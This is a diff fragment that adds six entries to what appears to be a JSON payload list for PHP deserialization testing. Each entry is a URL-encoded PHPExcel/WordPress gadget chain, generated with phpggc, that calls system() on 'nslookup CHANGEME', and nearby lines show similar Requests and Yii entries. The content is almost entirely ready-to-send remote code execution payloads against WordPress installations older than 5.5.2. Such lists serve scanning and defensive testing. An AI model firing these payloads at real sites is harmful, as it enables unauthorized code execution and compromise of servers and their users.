@@ -186,6 +186,42 @@
     "payload": "C:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}"
   },
   {
+    "_needs_dynamic_payload_editing": false,
+    "name": "PHPExcel 1.8.2+ & WP < 5.5.2 (1)",
+    "gen_with": "./phpggc WordPress/PHPExcel/RCE1 <function> <parameter>",
+    "payload": "O:17:\"PHPExcel_RichText\":1:{s:35:\"%00PHPExcel_RichText%00richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "PHPExcel <= 1.8.1 & WP < 5.5.2 (2)",
+    "gen_with": "./phpggc WordPress/PHPExcel/RCE2 <function> <parameter>",
+    "payload": "O:17:\"PHPExcel_RichText\":1:{s:36:\"%00PHPExcel_RichText%00_richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "PHPExcel 1.8.2+ & WP < 5.5.2 (3)",
+    "gen_with": "./phpggc WordPress/PHPExcel/RCE3 <function> <parameter>",
+    "payload": "O:37:\"PHPExcel_CachedObjectStorage_DiscISAM\":2:{s:47:\"%00PHPExcel_CachedObjectStorage_DiscISAM%00fileName\"%3BO:17:\"PHPExcel_RichText\":1:{s:35:\"%00PHPExcel_RichText%00richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}s:49:\"%00PHPExcel_CachedObjectStorage_DiscISAM%00fileHandle\"%3Bi:42%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "PHPExcel <= 1.8.1 & WP < 5.5.2 (4)",
+    "gen_with": "./phpggc WordPress/PHPExcel/RCE4 <function> <parameter>",
+    "payload": "O:37:\"PHPExcel_CachedObjectStorage_DiscISAM\":2:{s:48:\"%00PHPExcel_CachedObjectStorage_DiscISAM%00_fileName\"%3BO:17:\"PHPExcel_RichText\":1:{s:36:\"%00PHPExcel_RichText%00_richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}s:50:\"%00PHPExcel_CachedObjectStorage_DiscISAM%00_fileHandle\"%3Bi:42%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "PHPExcel 1.8.2+ & WP < 5.5.2 (5)",
+    "gen_with": "./phpggc WordPress/PHPExcel/RCE5 <function> <parameter>",
+    "payload": "O:25:\"PHPExcel_Shared_XMLWriter\":1:{s:39:\"%00PHPExcel_Shared_XMLWriter%00tempFileName\"%3BO:17:\"PHPExcel_RichText\":1:{s:35:\"%00PHPExcel_RichText%00richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "PHPExcel <= 1.8.1 & WP < 5.5.2 (6)",
+    "gen_with": "./phpggc WordPress/PHPExcel/RCE6 <function> <parameter>",
+    "payload": "O:25:\"PHPExcel_Shared_XMLWriter\":1:{s:40:\"%00PHPExcel_Shared_XMLWriter%00_tempFileName\"%3BO:17:\"PHPExcel_RichText\":1:{s:36:\"%00PHPExcel_RichText%00_richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}}"
+  },
+  {
     "_needs_dynamic_payload_editing": true,
     "name": "Yii 1.1.20",
     "gen_with": "./phpggc Yii/RCE1 <function> <parameter>",
